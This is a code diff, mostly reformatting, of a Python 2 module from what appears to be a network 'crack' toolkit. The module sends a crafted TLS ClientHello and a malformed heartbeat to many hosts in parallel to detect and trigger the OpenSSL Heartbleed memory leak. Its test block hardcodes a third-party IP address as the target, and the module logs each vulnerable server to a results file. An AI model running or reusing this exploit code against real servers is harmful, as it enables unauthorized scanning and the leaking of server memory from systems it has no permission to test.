@@ -5,15 +5,15 @@ import socket
 import select
 import time
 import threading
-from printers import printPink,printRed
+from comm.printers import printPink, printRed
 from multiprocessing.dummy import Pool
 
+
 class ssl_burp(object):
-    
-    def __init__(self,c):
-        self.config=c
-        self.lock=threading.Lock()
-        self.result=[]
+    def __init__(self, c):
+        self.config = c
+        self.lock = threading.Lock()
+        self.result = []
 
         self.hello = self.h2bin('''
         16 03 02 00  dc 01 00 00 d8 03 02 53
@@ -38,12 +38,10 @@ class ssl_burp(object):
         01 40 00
         ''')
 
-
-    def h2bin(self,x):
+    def h2bin(self, x):
         return x.replace(' ', '').replace('\n', '').decode('hex')
 
-
-    def recvall(self,s, length, timeout=8):
+    def recvall(self, s, length, timeout=8):
         endtime = time.time() + timeout
         rdata = ''
         remain = length
@@ -61,7 +59,7 @@ class ssl_burp(object):
                 remain -= len(data)
         return rdata
 
-    def recvmsg(self,s):
+    def recvmsg(self, s):
         hdr = self.recvall(s, 5)
         if hdr is None:
             return None, None, None
@@ -69,8 +67,7 @@ class ssl_burp(object):
         pay = self.recvall(s, ln, 10)
         return typ, ver, pay
 
-
-    def hit_hb(self,s,ip,port):
+    def hit_hb(self, s, ip, port):
         s.send(self.hb)
         while True:
             typ, ver, pay = self.recvmsg(s)
@@ -80,66 +77,76 @@ class ssl_burp(object):
             if typ == 24:
                 if len(pay) > 3:
                     self.lock.acquire()
-                    printRed('WARNING: %s ssl at %s returned more data than it should - server is vulnerable!\r\n' %(ip,port))
-                    self.result.append('WARNING: %s ssl at %s returned more data than it should - server is vulnerable!\r\n' %(ip,port))
+                    printRed(
+                        '[+] WARNING: %s ssl at %s returned more data than it should - server is vulnerable!\r\n' % (
+                            ip, port))
+                    self.result.append(
+                        '[+] WARNING: %s ssl at %s returned more data than it should - server is vulnerable!\r\n' % (
+                            ip, port))
                     self.lock.release()
                 else:
                     self.lock.acquire()
-                    printRed('%s ssl at %s processed malformed heartbeat, but did not return any extra data.\r\n' %(ip,port))
-                    self.result.append('%s ssl at %s processed malformed heartbeat, but did not return any extra data.\r\n' %(ip,port))
+                    printRed(
+                        '[+] %s ssl at %s processed malformed heartbeat, but did not return any extra data.\r\n' % (
+                            ip, port))
+                    self.result.append(
+                        '[+] %s ssl at %s processed malformed heartbeat, but did not return any extra data.\r\n' % (
+                            ip, port))
                     self.lock.release()
                 return True
 
             if typ == 21:
                 return False
 
-    def openssl_test(self,ip,port):
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sys.stdout.flush()
-                s.connect((ip, port))
-                sys.stdout.flush()
-                s.send(self.hello)
-                sys.stdout.flush()
-                while True:
-                    typ, ver, pay = self.recvmsg(s)
-                    if typ == None:
-                        break
-                    # Look for server hello done message.
-                    if typ == 22 and ord(pay[0]) == 0x0E:
-                        break
-                sys.stdout.flush()
-                s.send(self.hb)
-                self.hit_hb(s,ip,port)
-            except Exception,e:
-                #print e
-                pass
+    def openssl_test(self, ip, port):
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sys.stdout.flush()
+            s.connect((ip, port))
+            sys.stdout.flush()
+            s.send(self.hello)
+            sys.stdout.flush()
+            while True:
+                typ, ver, pay = self.recvmsg(s)
+                if typ == None:
+                    break
+                # Look for server hello done message.
+                if typ == 22 and ord(pay[0]) == 0x0E:
+                    break
+            sys.stdout.flush()
+            s.send(self.hb)
+            self.hit_hb(s, ip, port)
+        except Exception, e:
+            # print e
+            pass
 
-
-    def run(self,ipdict,pinglist,threads,file):
+    def run(self, ipdict, pinglist, threads, file):
         if len(ipdict['ssl']):
-            printPink("crack ssl  now...")
+            print "[*] crack ssl  now..."
             print "[*] start test openssl_heart  %s" % time.ctime()
-            starttime=time.time()
+            starttime = time.time()
 
-            pool=Pool(threads)
+            pool = Pool(threads)
             for ip in ipdict['ssl']:
-                pool.apply_async(func=self.openssl_test,args=(str(ip).split(':')[0],int(str(ip).split(':')[1])))
+                pool.apply_async(func=self.openssl_test, args=(str(ip).split(':')[0], int(str(ip).split(':')[1])))
             pool.close()
             pool.join()
 
             print "[*] stop ssl serice  %s" % time.ctime()
-            print "[*] crack ssl done,it has Elapsed time:%s " % (time.time()-starttime)
+            print "[*] crack ssl done,it has Elapsed time:%s " % (time.time() - starttime)
 
             for i in xrange(len(self.result)):
-                self.config.write_file(contents=self.result[i],file=file)   
+                self.config.write_file(contents=self.result[i], file=file)
+
 
 if __name__ == '__main__':
     import sys
+
     sys.path.append("../")
     from comm.config import *
-    c=config()
-    ipdict={'ssl': ['222.22.224.142:443']} 
-    pinglist=['122.225.81.129']
-    test=ssl_burp(c)
-    test.run(ipdict,pinglist,50,file="../result/test")
+
+    c = config()
+    ipdict = {'ssl': ['222.22.224.142:443']}
+    pinglist = ['122.225.81.129']
+    test = ssl_burp(c)
+    test.run(ipdict, pinglist, 50, file="../result/test")
